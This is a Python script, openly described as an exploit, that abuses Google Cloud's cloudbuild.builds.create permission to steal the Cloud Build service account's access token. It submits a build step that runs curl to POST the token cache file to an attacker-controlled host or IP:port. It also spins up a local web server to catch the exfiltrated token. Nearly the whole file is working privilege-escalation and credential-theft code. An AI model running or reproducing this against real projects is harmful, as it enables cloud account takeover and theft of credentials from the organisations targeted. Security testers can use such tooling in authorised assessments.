#!/usr/bin/env python3

import argparse
import google.oauth2.credentials
from google.oauth2 import service_account
from googleapiclient import discovery
import socketserver
import http.server
import sys
import json


def main(args):
    if not args.listening_host and not args.ip_port:
        print('Exactly one of --listening-host or --ip-port must be specified.')
        sys.exit(1)

    if args.service_account_credential_file_path:
        credentials = service_account.Credentials.from_service_account_file(args.service_account_credential_file_path)
        cb = discovery.build('cloudbuild', 'v1', credentials=credentials)
    else:
        use_access_token = input('No credential file passed in, enter an access token to authenticate? (y/n) ')
        if use_access_token.rstrip().lower() == 'y':
            access_token = input('Enter an access token to use for authentication: ')
            credentials = google.oauth2.credentials.Credentials(access_token.rstrip())
            cb = discovery.build('cloudbuild', 'v1', credentials=credentials)
        else:
            default = input('No credential file passed in and no access token entered, use the application-default credentials? (y/n) ')
            if default.rstrip().lower() == 'y':
                cb = discovery.build('cloudbuild', 'v1')
            else:
                print('\nNo authentication method selected.')
                return

    if args.listening_host:
        command = f'import os;os.system("curl -d @/root/tokencache/gsutil_token_cache {args.listening_host}")'
    else:
        command = f'import os;os.system("curl -d @/root/tokencache/gsutil_token_cache {args.ip_port}")'

    build_body = {
        'steps': [
            {
                'name': 'python',
                'entrypoint': 'python',
                'args': [
                    '-c',
                    command
                ]
            }
        ]
    }

    response = cb.projects().builds().create(projectId=args.project_id, body=build_body).execute()
    print(json.dumps(response, indent=4))

    if args.ip_port:
        ip, port = args.ip_port.split(':')

        class myHandler(http.server.SimpleHTTPRequestHandler):
            def do_POST(self):
                content_len = int(self.headers.get('Content-Length'))
                post_body = self.rfile.read(content_len).decode()
                if 'token=' in post_body:
                    print(post_body)
                    print('')
                    return

        socketserver.TCPServer.allow_reuse_address = True
        handler = socketserver.TCPServer(('', int(port)), myHandler)
        print(f'Web server started at 0.0.0.0:{port}.')
        print(f'Waiting for token at {ip}:{port}...\n')
        handler.handle_request()
    else:
        print(f'Build submitted. Now wait for the token to show up to {args.listening_host}...')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A script to exploit the cloudbuild.builds.create privilege escalation method to extract the access token belonging to the Cloud Build Service Account.')
    parser.add_argument('-p', '--project-id', required=True, help='The ID of the project that you are targeting. Example: test-project-11111')
    parser.add_argument('-l', '--listening-host', required=False, help='The full URL of an HTTP(S) server where the Cloud Build Service Account can be POSTed. Example: https://myserver.tld/token. By default, a web server will be spun up on 0.0.0.0 to listen for the exiltrated token.')
    parser.add_argument('-i', '--ip-port', required=False, help='The IP address and port of the current server. This is to be used instead of --listening-host. When specified, a web server will start listening on 0.0.0.0:PORT and the token will be exfiltrated to the IP/port specified here. Example: 1.1.1.1:8080')
    parser.add_argument('-f', '--service-account-credential-file-path', required=False, default=None, help='The path to the JSON file that contains the private key for a GCP Service Account. By default, you will be prompted for a user access token, then if you decline to enter one it will prompt you to default to the default system credentials. More information here: https://google-auth.readthedocs.io/en/latest/user-guide.html#service-account-private-key-files and here: https://google-auth.readthedocs.io/en/latest/user-guide.html#user-credentials')

    args = parser.parse_args()

    main(args)
